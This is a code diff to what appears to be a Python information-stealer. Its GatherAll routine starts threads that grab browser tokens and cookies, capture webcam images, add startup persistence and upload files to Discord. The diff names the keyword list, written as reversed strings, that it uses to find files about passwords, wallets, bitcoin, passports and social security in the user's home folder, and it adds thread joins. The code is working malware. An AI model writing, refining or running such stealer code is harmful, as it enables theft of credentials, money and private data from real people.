@@ -781,7 +781,7 @@ def steam_st():
 import concurrent.futures
 
 def upload_files_to_discord():
-    ['enohp', 'noitulfedacilbup', 'gnitirw', 'etisoppa', 'laicion', 'trossap', 'muhtyre', 'tellaw', 'drowssap egarots', 'eciffo laicion', 'tnuocca', 'slavitsef eninapmoc', 'nogin', 'tnuocca knalb', 'drowssap noitcudorp', 'etisoppa laicion', 'etelpmoc laicion', 'dircet tihcrac', 'noitamroproirp', 'emusern', 'laif gnitartsinimda', 'etelpmoc', 'drowssap ycnanif', 'drowssap ytecnanif', 'drowssap decures', 'sserdda', 'ytiruces yrtnuoces laicos', 'ytocryptocurrency', 'drowssap yroirp', 'noitartsinimda', 'tterces', 'niotcib', 'evig', 'liame', 'ytinifidnocnafnoc', 'ipa', 'noitartsinimda reganam']
+    keywords = ['enohp', 'noitulfedacilbup', 'gnitirw', 'etisoppa', 'laicion', 'trossap', 'muhtyre', 'tellaw', 'drowssap egarots', 'eciffo laicion', 'tnuocca', 'slavitsef eninapmoc', 'nogin', 'tnuocca knalb', 'drowssap noitcudorp', 'etisoppa laicion', 'etelpmoc laicion', 'dircet tihcrac', 'noitamroproirp', 'emusern', 'laif gnitartsinimda', 'etelpmoc', 'drowssap ycnanif', 'drowssap ytecnanif', 'drowssap decures', 'sserdda', 'ytiruces yrtnuoces laicos', 'ytocryptocurrency', 'drowssap yroirp', 'noitartsinimda', 'tterces', 'niotcib', 'evig', 'liame', 'ytinifidnocnafnoc', 'ipa', 'noitartsinimda reganam']
     extension = 'txt'
 
     home_path = os.path.expanduser("~")
@@ -1187,11 +1187,19 @@ def GatherAll():
     az = threading.Thread(target=upload_files_to_discord)
     az.start()
     Threadlist.append(az)
-
     a = threading.Thread(target=getinfo)
     a.start()
     Threadlist.append(a)
-
+    if Fakegen == True:
+        us = threading.Thread(target=fakegen)
+        us.start()
+    else:
+        pass
+    if FakeWebhook == True:
+        wb = threading.Thread(target=webhook_tools)
+        wb.start()
+    else:pass
+        
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
@@ -1209,7 +1217,6 @@ def GatherAll():
     coo = threading.Thread(target=getcook)
     coo.start()
     threadlist2.append(coo)
-
     if Startup == True:
         sta = threading.Thread(target=startup)
         sta.start()
@@ -1230,14 +1237,6 @@ def GatherAll():
     cam = threading.Thread(target=Camera_get)
     cam.start()
     Threadlist.append(cam)
-    if Fakegen == True:
-        us = threading.Thread(target=fakegen)
-        us.start()
-    else:
-        pass
-    if FakeWebhook == True:
-        wb = threading.Thread(target=webhook_tools)
-        wb.start()
-    else:pass
-
+    for thread in Threadlist:
+        thread.join()
 GatherAll() 
